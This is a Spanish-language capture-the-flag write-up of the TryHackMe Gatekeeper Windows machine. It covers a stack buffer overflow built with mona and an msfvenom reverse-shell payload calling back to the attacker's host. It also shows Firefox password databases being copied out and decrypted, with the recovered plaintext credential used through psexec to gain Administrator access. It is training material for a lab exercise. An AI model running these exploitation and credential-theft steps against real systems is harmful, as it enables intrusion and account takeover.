---
layout: single
title: Máquina Gatekeeper - TryHackMe (OSCP Style) (Offensive Pentesting Path)
excerpt: "Esta máquina sigue el apartado del Buffer Overflow del path. Se trata de una máquina Windows con un servicio que hay que explotar con un buffer overflow. Posteriormente escalaremos privilegios descifrando una database de contraseñas de un navegador web."
date: 2022-07-18
classes: wide
header:
  teaser: /assets/images/gatekeeper/portada.jpg
  teaser_home_page: true
categories:
  - Comunidad
  - Blog
  - Writeup
tags:
  - fuzzing
  - overflow
  - immunity debugger
  - mona
  - windows
  - badchars
  - scripting
  - firefox
  - pivoting
  - psexec
---

# Introducción
La máquina se encuentra en [TryHackMe](https://tryhackme.com/room/gatekeeper). Es una máquina Windows que cuenta con un servicio vulnerable a Buffer Overflow. Para explotarlo, deberemos primero pasar el binario a una máquina donde podamos replicar los ataques a fin de obtener el script que logre vulnerarlo. Al final, solo ejecutaremos dicho script en la máquina víctima.

Posteriormente, para escalar a usuario Administrator, deberemos descifrar una base de datos de contraseñas guardadas en Firefox y conectarnos a la máquina víctima por medio de psexec.

# Escaneo de puertos
Verificamos que se trata de una máquina Windows por medio de una traza ICMP.

![1]

Iniciamos con un escaneo básico con **nmap** en busca de puertos abiertos en el sistema víctima:

    nmap -sS --min-rate 5000 -p- --open -Pn -n -vv 10.10.181.112 -oG allPorts

![2]

Observamos que hay varios puertos abiertos: entre ellos el servicio SMB (139 y 445) y dos desconocidos: 3387 y 31337; el resto pueden ser descartados.

Realizamos un escaneo a profundidad de dichos puertos en busca de servicios y versiones que corren en ellos.

    nmap -sC -sV -p<PUERTOS> 10.10.181.112 -oN targeted

![3]

Vemos que en el puerto desconocido (31337) detecta ciertos comandos que el programa parece estar regresando, dándonos a entender que se trata de un servicio personalizado.

# SMB
Intentamos loguearnos por medio de un usuario anónimo para listar los servicios compartidos por SMB:

    smbclient -L 10.10.181.112 -N

Este comando nos devuelve una carpeta compartida a la cual podemos acceder, llamada **Users**. Accedemos con la misma herramienta:

    smbclient //10.10.181.112/Users -N

Dentro encontraremos el siguiente directorio:

![4]

Destaca la carpeta **Share**, donde dentro podemos encontrar un binario llamado **gatekeeper.exe**. Dando seguimiento a las máquinas que hemos resuelto hasta ahora, es probable que se trate de el binario del servicio que corre en el puerto 31337.

![5]

# Enumeración de los puertos restantes
Como desconocemos los servicios que corren en los dos puertos que nos quedan, intentamos conectarnos a ellos primero con ayuda de **telnet**. El primero de ellos (3389) no nos devuelve ninguna cabecera ni información al respecto, por lo que pasamos de él de momento.

![6]

El segundo (31337) sí nos devuelve algo. Se trata de un servicio que recibe una cadena como entrada y devuelve un saludo del estilo:

    Hello <ENTRADA>

Este tipo de servicios abiertos y que solicitan una entrada de datos pueden ser vulnerables a Buffer Overflow.

![7]

# Análisis del BoF y creación del exploit
Para corroborar eso último, mandamos una enorme cantidad de caracteres para ver si el servicio logra crashear. Se intentó con 1000 caracteres:

    Con esto generamos la cantidad de caracteres necesarios:
    python -c "print('A'*1000)"

![8]

Como podemos ver, el servicio crashea y cierra la conexión al recibir esta cantidad de información. Iniciamos el análisis pasando el binario a nuestro Windows 7 para debuguearlo y encontrar el offset para el Buffer Overflow.

Como podemos ver, tenemos conexión con el server y este muestra en consola la cantidad de caracteres que recibe y la cantidad de caracteres que devuelve:

![9]

Corremos nuestro script [fuzzer.py](https://github.com/blu3ming/Buffer-Overflow-Scripts/blob/main/fuzzer.py), pero por desgracia este no logra completarse dado que cierra conexión desde 100 caracteres. Esto es un error, ya que incluso se intentó con un solo caracter y aún así saltaba el mismo problema:

![10]

Por lo tanto, trataremos de adivinar el número de caracteres inicial. Como vimos en la ejecución inicial, con 1000 caracteres es más que suficiente para que el servicio crasheé, así que ejecutamos el script [exploit.py](https://github.com/blu3ming/Buffer-Overflow-Scripts/blob/main/exploit.py) con esta cantidad de bytes en el payload.

![11]

Como podemos ver, el servicio crashea y el EIP se sobreescribe con las 4 A's. Trabajaremos con este valor a partir de ahora. Creamos ahora nuestro patrón de caracteres con ayuda de **pattern_create.rb**:

    /opt/metasploit-framework-5101/tools/exploit/pattern_create.rb -l 1000

**Nota:** Esta ruta puede cambiar de sistema a sistema, en algunos se localiza en /usr/share/metasploit-framework...

![12]

Enviamos este patrón en el payload de nuestro **exploit.py**. Cuando crasheé el servicio, buscamos el offset exacto en el que se sobreescribe el EIP.

    !mona findmsp -distance 1000

El análisis retorna que el offset exacto es de 146 (bastante alejado de los 1000 caracteres que enviamos, pero más vale que sobre a que falte), es decir, necesitamos enviar 146 caracteres para llegar al momento exacto donde inicia el EIP.

![13]

Colocamos "BBBB" en la variable **retn** para corroborar que podamos sobreescribir el registro EIP, ya habiendo colocado el offset correcto en el script. Como se observa, esto es posible (EIP vale 42424242).

![14]

El siguiente paso es buscar los badchars del servicio. Iniciamos creando el bytearray base en mona contemplando el badchar \x00 por defecto:

    !mona bytearray -b "\x00"

Colocamos la cadena de bytes en nuestro script, contemplando igualmente el \x00 por defecto y lo ejecutamos. Hacemos el comparativo de ambos con ayuda de mona para detectar los badchars:

    !mona compare -f c:\mona\gatekeeper\bytearray.bin -a <DIRECCION DEL ESP>

![15]

Como podemos observar, en la primera pasada logramos obtener dos badchars: el default \x00 y el \x0a. Para continuar, volvemos a ejecutar los pasos de crear el bytearray y enviarlo en el payload evitando este nuevo badchar. Ya en esta segunda pasada, obtenemos el **Unmodified**.

![16]

Ahora, buscamos la dirección de la instrucción JMP ESP en el binario o su biblioteca que tenga el ASLR y SEH deshabilitados y que no contengan el badchar encontrado.

    !mona jmp -r esp -cpb "\x00\x0a"

![17]

Copiamos la dirección encontrada en nuestro script, añadimos los NOP's y creamos nuestro payload con ayuda de msfvenom:

    msfvenom -p windows/shell_reverse_tcp LHOST=10.10.103.114 LPORT=443 EXITFUNC=thread -b "\x00\x0a" -f c

Creamos una reverse shell que se conecte a nuestra máquina sin que empleé el badchar encontrado. Lo agregamos a la variable payload del *exploit.py* junto con los demás datos para el BoF.

![18]

Ya con todo listo, lo ejecutamos con una consola aparte en escucha con ayuda de netcat. Vemos cómo inmediatamente obtenemos la cmd en el sistema, habiendola comprometido exitosamente.

![19]

# Comprometiendo el sistema original
Ya que vimos que el script funciona, comprometemos el sistema original solo cambiando la IP destino:

![20]

Al acceder al sistema, buscamos la flag de usuario, encontrándola en el directorio Desktop del usuario **natbat**.

![21]

# Escalada de privilegios
Listamos primero los privilegios con los que contamos en el sistema, sin embargo, no encontramos nada de lo que nos podamos aprovechar.

![22]

Llama la atención que en el escritorio se tenga un acceso directo (.lnk) a Firefox, el navegador web; es algo que no suele estar presente en las máquinas CTF, así que podría significar algo. En este sentido, podría ser que podamos acceder a la base de datos de contraseñas de este navegador para descifrarlas y obtener credenciales válidas.

![23]

Para corroborarlo, entramos a la carpeta *Program Files* para verificar su instalación en el sistema.

![24]

# Descifrado de password database de Firefox
El procedimiento para descifrar una base de datos de contraseñas de este navegador consiste en tomar dos archivos de los profiles, pasándolos por un script que logra descifrarlas siempre y cuando estas no se encuentren tras una master password.

Para lograrlo, tendríamos que tener una forma de pasar archivos a nuestra máquina. Para ello, recordemos que contamos con una carpeta compartida por SMB, así que la ubicamos en el sistema para utilizarla. Esta se encuentra en C:\Users\Share:

![25]

Ya ubicada, copiamos los siguientes archivos:

    key4.db
    logins.json

Estos se encuentran dentro del siguiente directorio:

    C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles

Dentro ubicaremos un par de carpetas concernientes a los profiles del navegador web, dentro de uno de ellos estarán los archivos necesarios.

![26]

Para lograr descifrar las contraseñas contenidas en estos archivos, podemos emplear el script [firepwd](https://github.com/lclevy/firepwd). Al ejecutarlo, nos encontramos con el siguiente error, indicando que el argumento de una función debe ser una string:

![27]

Dando un vistazo en los Pull Requests del repositorio me encuentro con que alguien hizo una propuesta de cambio para arreglar este problema (el cual no fue aceptado, no entiendo por qué). Básicamente solo propone castear a string dicho argumento:

![28]

Volviendo a ejecutar el script, vemos que este nos regresa las credenciales en tecto claro:

    mayor:8CL701N78MdrCIsV

![29]

# Acceso al sistema como Administrator
Cuando contamos con un sistema Windows que tiene el servicio SMB habilitado, podemos entablar una conexión con este por medio de credenciales con una herramienta llamada **psexec**. Por desgracia, la Attack Box de TryHackMe no tiene esta herramienta bien configurada, así que cambié a mi propia Kali para esto.

Cabe mencionar que batallé mucho con los scripts del Firefox antes igual por culpa de la Attack Box, no lograba instalar las dependencias apropiadas ni ejecutar varios script que realizan la misma función, *firepwd* es la única que me funcionó; a partir de ahora, emplearé mi propia Kali.

Nos conectamos por medio de psexec al sistema proporcionando las credenciales obtenidas:

    psexec.py WORKGROUP/mayor:8CL701N78MdrCIsV@10.10.90.108

    - Ejecutamos la herramienta
    - Indicamos el grupo de sistema (cuando no lo conocemos, por defecto es WORKGROUP)
    - Proporcionamos el suario
    - Contraseña
    - Indicamos la IP del sistema destino

![30]

Como podemos observar, logramos obtener acceso al sistema y como el usuario administrador. Por último, solo buscamos la flag de root, la cual se encuentra en el directorio Desktop de este usuario.

![31]

[1]:/assets/images/gatekeeper/1.png
[2]:/assets/images/gatekeeper/2.png
[3]:/assets/images/gatekeeper/3.png
[4]:/assets/images/gatekeeper/4.png
[5]:/assets/images/gatekeeper/5.png
[6]:/assets/images/gatekeeper/6.png
[7]:/assets/images/gatekeeper/7.png
[8]:/assets/images/gatekeeper/8.png
[9]:/assets/images/gatekeeper/9.png
[10]:/assets/images/gatekeeper/10.png
[11]:/assets/images/gatekeeper/11.png
[12]:/assets/images/gatekeeper/12.png
[13]:/assets/images/gatekeeper/13.png
[14]:/assets/images/gatekeeper/14.png
[15]:/assets/images/gatekeeper/15.png
[16]:/assets/images/gatekeeper/16.png
[17]:/assets/images/gatekeeper/17.png
[18]:/assets/images/gatekeeper/18.png
[19]:/assets/images/gatekeeper/19.png
[20]:/assets/images/gatekeeper/20.png
[21]:/assets/images/gatekeeper/21.png
[22]:/assets/images/gatekeeper/22.png
[23]:/assets/images/gatekeeper/23.png
[24]:/assets/images/gatekeeper/24.png
[25]:/assets/images/gatekeeper/25.png
[26]:/assets/images/gatekeeper/26.png
[27]:/assets/images/gatekeeper/27.png
[28]:/assets/images/gatekeeper/28.png
[29]:/assets/images/gatekeeper/29.png
[30]:/assets/images/gatekeeper/30.png
[31]:/assets/images/gatekeeper/31.png